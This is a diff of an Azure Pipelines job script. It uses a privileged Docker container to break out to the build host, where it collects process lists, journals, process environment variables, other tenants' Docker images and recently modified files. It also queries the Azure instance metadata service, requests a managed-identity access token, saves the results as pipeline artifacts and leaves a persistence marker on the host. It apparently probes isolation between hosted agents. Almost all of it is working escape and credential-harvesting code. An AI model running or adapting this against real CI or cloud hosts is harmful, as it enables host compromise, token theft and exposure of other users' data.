@@ -17,65 +17,47 @@ stages:
         script: |
           set -euo pipefail
           mkdir -p artifacts
-
           echo "Job UTC start: $(date -u '+%Y-%m-%d %H:%M:%S')" | tee artifacts/job-start-utc.txt
 
-          # Escape to host with full privileges & host namespaces (expected on MS-hosted Linux)
           docker run --rm --privileged --network=host --pid=host \
             -v /:/hostfs \
             -v /var/run/docker.sock:/var/run/docker.sock \
             -v "$(pwd)/artifacts":/artifacts \
-            alpine:3.20 sh -eu -c '
-              # --- Tooling ---
+            alpine:3.20 sh -e -c '
+              set -o pipefail
               apk add --no-cache curl jq coreutils util-linux procps iproute2 iptables nftables \
                                   bind-tools netcat-openbsd ca-certificates docker-cli >/dev/null || true
 
-              # Ensure files exist to avoid set -u pitfalls
-              : > /artifacts/host-boot-uptime-s.txt
-              : > /artifacts/host-who-boot.txt
-              : > /artifacts/host-pid1-start.txt
-              : > /artifacts/host-machine-id.txt
-              : > /artifacts/host-hostnamectl.txt
-              : > /artifacts/host-listen-ports.txt
-              : > /artifacts/systemd-units.txt
-              : > /artifacts/journal-last300.txt
-              : > /artifacts/journal-webbits.txt
-              : > /artifacts/host-docker-images.txt
-              : > /artifacts/foreign-images.txt
-              : > /artifacts/foreign-image-root-ls.txt
-              : > /artifacts/ss-tcp.txt
-              : > /artifacts/xsp-8084-response.txt
-              : > /artifacts/imds-connectivity.txt
-              : > /artifacts/imds-instance.txt
-              : > /artifacts/imds-msi-token.txt
-              : > /artifacts/recent-files-since-boot.txt
-              : > /artifacts/residual-marker.txt
+              # Pre-create targets so later reads never fail
+              for f in host-boot-uptime-s.txt host-who-boot.txt host-pid1-start.txt host-machine-id.txt \
+                       host-hostnamectl.txt host-listen-ports.txt systemd-units.txt journal-last300.txt \
+                       journal-webbits.txt docker-version.txt docker-ps-a.txt docker-images.txt \
+                       host-docker-images.txt foreign-images.txt foreign-image-root-ls.txt \
+                       ss-tcp.txt xsp-8084-response.txt imds-connectivity.txt imds-instance.txt \
+                       imds-msi-token.txt recent-files-since-boot.txt residual-marker.txt; do
+                : > "/artifacts/$f"
+              done
 
-              # --- 0) Baseline host identity & timing ---
+              # 0) Identity & timing
               { chroot /hostfs /usr/bin/uptime -s || true; } > /artifacts/host-boot-uptime-s.txt
               { chroot /hostfs /usr/bin/who -b    || true; } > /artifacts/host-who-boot.txt
               { chroot /hostfs /usr/bin/ps -o pid,lstart,cmd -p 1 || true; } > /artifacts/host-pid1-start.txt
               { /bin/cat /hostfs/etc/machine-id || true; } > /artifacts/host-machine-id.txt
               { chroot /hostfs /usr/bin/hostnamectl || true; } > /artifacts/host-hostnamectl.txt
 
-              # --- 1) Process & service census (with start times) ---
-              chroot /hostfs /usr/bin/ps -eo pid,ppid,user,lstart,cmd \
-                > /artifacts/ps-full.txt || true
+              # 1) Process & services
+              chroot /hostfs /usr/bin/ps -eo pid,ppid,user,lstart,cmd > /artifacts/ps-full.txt || true
               chroot /hostfs /usr/bin/ss -plnt > /artifacts/host-listen-ports.txt || true
-              ( chroot /hostfs /bin/systemctl list-units --type=service --no-pager --all || true ) \
-                > /artifacts/systemd-units.txt
-              ( chroot /hostfs /bin/journalctl -b -n 300 --no-pager || true ) \
-                > /artifacts/journal-last300.txt
-              ( chroot /hostfs /bin/journalctl -b -u ssh -u php*-fpm* -u mono* --no-pager || true ) \
-                > /artifacts/journal-webbits.txt
+              ( chroot /hostfs /bin/systemctl list-units --type=service --no-pager --all || true ) > /artifacts/systemd-units.txt
+              ( chroot /hostfs /bin/journalctl -b -n 300 --no-pager || true ) > /artifacts/journal-last300.txt
+              ( chroot /hostfs /bin/journalctl -b -u ssh -u php*-fpm* -u mono* --no-pager || true ) > /artifacts/journal-webbits.txt
 
-              # --- 2) Environment harvest (redacted) from candidate procs ---
+              # 2) Env harvest (safe, keeps pipeline alive even if no matches)
               mkdir -p /artifacts/proc-env
               chroot /hostfs /usr/bin/ps -eo pid,user,cmd \
-                | grep -E "mono|php-fpm|dotnet|python|node|java|nginx|apache|ruby|go " || true \
-                | awk "{print \\$1}" \
-                | while read -r P; do
-                    [ -n "${P:-}" ] || continue
+                | awk "/mono|php-fpm|dotnet|python|node|java|nginx|apache|ruby|go / {print \\$1}" \
+                | while IFS= read -r P; do
+                    [ -n "$P" ] || continue
                     OUT="/artifacts/proc-env/${P}.env.txt"
                     if [ -r "/hostfs/proc/${P}/environ" ]; then
                       tr "\\0" "\\n" < "/hostfs/proc/${P}/environ" \
@@ -83,11 +65,11 @@ stages:
                           -e "s/[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+/[JWT_REDACTED]/g" \
                           -e "s/[A-Fa-f0-9]{24,}/[HEX_REDACTED]/g" \
                           -e "s/[A-Za-z0-9+/=]{32,}/[B64_REDACTED]/g" \
-                        > "${OUT}" || true
+                        > "$OUT" || true
                     fi
                   done
 
-              # --- 3) Docker / container runtime intel ---
+              # 3) Docker intel
               ( docker version || true ) > /artifacts/docker-version.txt
               ( docker ps -a   || true ) > /artifacts/docker-ps-a.txt
               ( docker images  || true ) > /artifacts/docker-images.txt
@@ -108,53 +90,46 @@ stages:
               moby/buildkit
               EOF
 
-              if docker images --format "{{.Repository}}:{{.Tag}}" >/artifacts/host-docker-images.txt 2>/dev/null; then
-                # create the file regardless so head/while never see a missing file
-                : > /artifacts/foreign-images.txt
-                # grep exit code 1 (no matches) is fine; we already created the file
-                grep -ivf /tmp/default_images.txt /artifacts/host-docker-images.txt \
-                  > /artifacts/foreign-images.txt || true
+              # Build clean list; drop dangling <none>:<none> and empties
+              ( docker images --format "{{.Repository}}:{{.Tag}}" 2>/dev/null \
+                  | grep -E -v "^<none>:" || true ) > /artifacts/host-docker-images.txt
 
-                if [ -s /artifacts/foreign-images.txt ]; then
-                  while IFS= read -r IMG; do
-                    [ -n "${IMG:-}" ] || continue
-                    docker run --rm --entrypoint sh "$IMG" -c "ls -lah / | head -n 200" \
-                      > /artifacts/foreign-image-root-ls.txt 2>&1 || true
-                  done < /artifacts/foreign-images.txt
-                fi
+              awk "NF" /artifacts/host-docker-images.txt \
+                | grep -ivf /tmp/default_images.txt 2>/dev/null \
+                > /artifacts/foreign-images.txt || true
+
+              if [ -s /artifacts/foreign-images.txt ]; then
+                while IFS= read -r IMG; do
+                  [ -n "$IMG" ] || continue
+                  docker run --rm --entrypoint sh "$IMG" -c "ls -lah / | head -n 200" \
+                    > /artifacts/foreign-image-root-ls.txt 2>&1 || true
+                done < /artifacts/foreign-images.txt
               fi
 
-              # --- 4) Network/IMDS probes (link-local & localhost ONLY) ---
+              # 4) Network / IMDS
               chroot /hostfs /usr/bin/ss -plnt > /artifacts/ss-tcp.txt || true
-              ( chroot /hostfs /usr/bin/curl -i --max-time 2 http://127.0.0.1:8084/ || true ) \
-                > /artifacts/xsp-8084-response.txt
-
-              ( echo "== IMDS ping =="; nc -zvw 1 169.254.169.254 80 || true ) \
-                > /artifacts/imds-connectivity.txt 2>&1
+              ( chroot /hostfs /usr/bin/curl -i --max-time 2 http://127.0.0.1:8084/ || true ) > /artifacts/xsp-8084-response.txt
+              ( echo "== IMDS ping =="; nc -zvw 1 169.254.169.254 80 || true ) > /artifacts/imds-connectivity.txt 2>&1
               ( curl -s -i -H "Metadata:true" --connect-timeout 1 --max-time 2 \
-                  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" || true ) \
-                > /artifacts/imds-instance.txt
+                  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" || true ) > /artifacts/imds-instance.txt
               ( curl -s -i -H "Metadata:true" --connect-timeout 1 --max-time 2 \
-                  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" || true ) \
-                > /artifacts/imds-msi-token.txt
+                  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" || true ) > /artifacts/imds-msi-token.txt
 
-              # --- 5) Host FS quick sweep for obvious residuals (time-bounded) ---
-              # If we fail to parse time, default to epoch 0 so the awk filter does not break
+              # 5) Recent files since boot
               BOOT_TXT="$(cat /artifacts/host-boot-uptime-s.txt 2>/dev/null || true)"
               BOOT_EPOCH="$(date -u -d "${BOOT_TXT:-now}" +%s 2>/dev/null || echo 0)"
-              find /hostfs/home /hostfs/root /hostfs/var/tmp /hostfs/tmp -xdev \
-                   -type f -printf "%T@ %p\n" 2>/dev/null \
-                   | awk -v boot="${BOOT_EPOCH:-0}" '"'"'$1 < boot { next } { $1=""; print substr($0,2) }'"'"' \
-                   | head -n 500 > /artifacts/recent-files-since-boot.txt || true
+              find /hostfs/home /hostfs/root /hostfs/var/tmp /hostfs/tmp -xdev -type f -printf "%T@ %p\n" 2>/dev/null \
+                | awk -v boot="${BOOT_EPOCH:-0}" '"'"'$1 < boot { next } { $1=""; print substr($0,2) }'"'"' \
+                | head -n 500 > /artifacts/recent-files-since-boot.txt || true
 
-              # --- 6) Residual marker (persistence across jobs) ---
+              # 6) Residual marker
               if [ -f /hostfs/var/tmp/azp-residual-marker.txt ]; then
                 echo "FOUND prior marker" > /artifacts/residual-marker.txt
                 cp /hostfs/var/tmp/azp-residual-marker.txt /artifacts/residual-marker-prev.txt || true
               else
                 echo "No prior marker" > /artifacts/residual-marker.txt
               fi
-              echo "marker $(date -u '+%Y-%m-%dT%H:%M:%SZ') $$" > /hostfs/var/tmp/azp-residual-marker.txt
+              echo "marker $(date -u +%Y-%m-%dT%H:%M:%SZ) $$" > /hostfs/var/tmp/azp-residual-marker.txt
             '
 
     - task: PublishPipelineArtifact@1
